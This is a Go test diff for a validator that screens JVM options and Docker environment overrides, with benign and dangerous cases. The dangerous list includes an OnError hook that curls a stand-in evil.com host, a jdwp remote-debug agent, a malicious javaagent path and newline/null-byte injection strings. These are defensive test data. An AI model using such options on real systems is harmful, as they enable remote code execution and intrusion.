@@ -319,3 +319,66 @@ func TestServerOverrideSafeRoots_ExpandsHostTranslation(t *testing.T) {
 		t.Errorf("expected no safe roots for an empty data path, got %v", got)
 	}
 }
+
+func TestValidateJVMOptions_Benign(t *testing.T) {
+	benignList := []string{
+		"",
+		"-Xmx4G -Xms2G",
+		"-Xmx1024m -Xms512m -Xss1m",
+		"-XX:+UseG1GC -XX:MaxGCPauseMillis=200",
+		"-Dfile.encoding=UTF-8 -Djava.awt.headless=true",
+		"-Xmx8g -XX:+AlwaysPreTouch",
+	}
+	for _, opts := range benignList {
+		if err := ValidateJVMOptions(opts); err != nil {
+			t.Errorf("expected %q to be valid, got %v", opts, err)
+		}
+	}
+}
+
+func TestValidateJVMOptions_Dangerous(t *testing.T) {
+	dangerousList := []struct {
+		name string
+		opts string
+	}{
+		{"OnError hook", "-XX:OnError=/bin/reboot"},
+		{"OnError with quotes", `-XX:OnError="curl http://evil.com"`},
+		{"OnOutOfMemoryError hook", "-XX:OnOutOfMemoryError=killall"},
+		{"agentlib", "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"},
+		{"agentpath", "-agentpath:/path/to/lib.so"},
+		{"Xrun", "-Xrunjdwp:transport=dt_socket"},
+		{"javaagent", "-javaagent:/tmp/evil.jar"},
+		{"UnlockDiagnosticVMOptions", "-XX:+UnlockDiagnosticVMOptions"},
+		{"Newline injection", "-Xmx2G\n-Dbad=true"},
+		{"Null byte injection", "-Xmx2G\x00-Dbad=true"},
+		{"CR injection", "-Xmx2G\r-Dbad=true"},
+		{"Zero max heap", "-Xmx0"},
+		{"Zero max heap with unit", "-Xmx0m"},
+		{"Missing size", "-Xmx"},
+		{"Invalid non-numeric size", "-Xmxx"},
+	}
+	for _, tt := range dangerousList {
+		t.Run(tt.name, func(t *testing.T) {
+			if err := ValidateJVMOptions(tt.opts); err == nil {
+				t.Errorf("expected %q (%s) to be rejected as dangerous/invalid", tt.opts, tt.name)
+			}
+		})
+	}
+}
+
+func TestValidateDockerOverridesConfinement_JVMOptions(t *testing.T) {
+	root := t.TempDir()
+	hostile := &v1.DockerOverrides{
+		Environment: map[string]string{"JVM_OPTS": "-XX:OnError=reboot"},
+	}
+	if err := ValidateDockerOverridesConfinement(hostile, ServerOverrideSafeRoots(root)...); err == nil {
+		t.Error("expected hostile JVM_OPTS in DockerOverrides to be rejected")
+	}
+
+	benign := &v1.DockerOverrides{
+		Environment: map[string]string{"JVM_OPTS": "-Xmx4G -Xms2G"},
+	}
+	if err := ValidateDockerOverridesConfinement(benign, ServerOverrideSafeRoots(root)...); err != nil {
+		t.Errorf("expected benign JVM_OPTS in DockerOverrides to pass, got %v", err)
+	}
+}
